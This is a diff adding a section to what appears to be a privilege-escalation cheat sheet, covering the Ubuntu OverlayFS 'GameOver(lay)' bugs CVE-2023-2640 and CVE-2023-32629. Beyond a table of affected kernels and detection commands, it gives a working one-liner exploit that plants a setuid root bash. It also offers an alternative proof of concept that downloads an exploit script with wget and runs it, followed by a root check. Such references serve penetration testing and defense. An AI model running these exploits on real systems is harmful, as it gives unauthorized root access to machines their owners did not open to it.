@@ -330,6 +330,57 @@ uid=0(root) gid=0(root) groups=0(root)
 
 **Reference:** https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
 
+### CVE-2023-2640 / CVE-2023-32629 - GameOver(lay) Ubuntu Kernel PrivEsc
+
+OverlayFS vulnerability in Ubuntu kernels allowing local privilege escalation.
+
+**Affected Kernels:**
+
+| Kernel Version | Ubuntu Release |
+|----------------|----------------|
+| 6.2.0 | Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish) |
+| 5.19.0 | Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish) |
+| 5.4.0 | Ubuntu 20.04 LTS (Focal Fossa) / Ubuntu 18.04 LTS (Bionic Beaver) |
+
+**Detection:**
+
+```bash
+uname -r
+# 6.2.0-25-generic  <- Vulnerable
+
+cat /etc/os-release
+# Ubuntu 22.04 LTS
+```
+
+**Exploit (One-liner):**
+
+```bash
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
+```
+
+**Alternative POC:**
+
+```bash
+# Download and run
+wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
+chmod +x exploit.sh
+./exploit.sh
+
+# Or manual steps
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
+```
+
+**Verify root:**
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+**References:**
+- https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
+- https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/
+
 ## Sudo-Shell escape Sequences
 
 * List the programs which sudo allows your user to run:
